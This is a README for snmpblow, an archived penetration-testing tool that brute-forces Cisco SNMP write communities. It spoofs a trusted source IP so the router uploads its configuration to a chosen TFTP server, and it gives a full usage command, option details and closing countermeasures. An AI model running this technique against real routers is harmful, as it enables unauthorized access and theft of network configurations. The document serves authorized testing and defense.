# snmpblow

This is a copy of snmpblow.pl, found via archive.org from http://www.scanit.be/uploads/snmpblow.pl

The contents of www.scanit.be/en_US/snmpblow.html follows:

snmpblow - blind Cisco IOS SNMP RW community brute forcer
Author:
Alexandre Bezroutchko

Description:
This script is useful to deal with Cisco routers in a following situation:

    SNMP RW (read-write) access is enabled
    Access list is configured to  accept SNMP requests from a trusted sources only, but you know (or can guess) a trusted IP address
    You are able to spoof source IP address of SNMP requests

In a presence of the access list, plain SNMP community string brute forcing with source IP address spoofing is rather useless, because you will never see responses to your requests. This script opts for guessing RW community string and makes use of Moving Files and Images Between a Router and TFTP Server via SNMP feature of Cisco IOS. The script sends a bulk of SNMP Cisco IOS config-copy requests with forged source IP address and user-specified list of community strings. If source IP address and community string is right, IOS will upload its config to the specified TFTP server.

This is by no means a new security vulnerability, just a useable implementation of a known technique.

In Scanit, we occasionally use this tool during internal network penetration tests to demonstrate an impact of a compromise of a single router: typically all network devices in the enterprise have the same SNMP community and access lists settings, therefore compromise of a single device likely to lead to compromise of the whole infrastructure. To know more about this and other security issues, you may consider attending our hacking course.

Usage:

$ snmpblow.pl -s 192.168.1.1 -d 1.2.3.4 -t 5.6.7.8 -f cfg.txt < communities.txt

The tool is written in Perl and requires Net::RawIP and Net::SNMP modules. If you *NIX distribution does not have it by default, you may get it from CPAN. Tested on Linux and FreeBSD, not tested on Windows. It requires root privileges to send packets with spoofed source IP.

Options:
Expects a list of community strings on stdin.
 -s   	Source IP address. To bypass SNMP access lists, you have to know (or guess) the source IP address from which the target Cisco will accept SNMP requests. Source IP address brute forcing is not supported.
 -S 	Source UDP port (optional, by default - 161)
 -d 	Destination IP address. Multiple targets or network ranges are not supported.
 -D 	Destination UDP port (optional, by default - 161)
 -t 	IP address of the TFTP server to send the config to. When you get the community right, the target will upload its config to the specified TFTP server. Ensure the server is running and accepting uploads of file you specify with -f command line switch. Note that some TFTP servers (notably *NIX ones require file to exist and be world-writeable to allow file uploads).
 -f 	File name to use for TFTP file uploads.

Download:
Get it here. 

Countermeasures:
Consider the following countermeasures to prevent abuse of SNMP interface of your routers.

    If SNMP RW access is not being used, by far the best solution is to disable it completely. Attackers will not be able to send config-copy requests to the router, but it may affect router management tools using the same technique.
    Next thing to consider is restricting TFTP traffic: add the access lists permitting TFTP to/from trusted IP addresses only.
    Anti-spoofing protection is a good idea as well. It will work in a situation when malicious traffic is coming from one network interface, and trusted one -- from another. This is usually the case for edge routers. However, when talking about internal attacks, this protection is not necessarily efficient. Anti-spoofing can be implemented with access lists or unicast reverse-path forwarding.

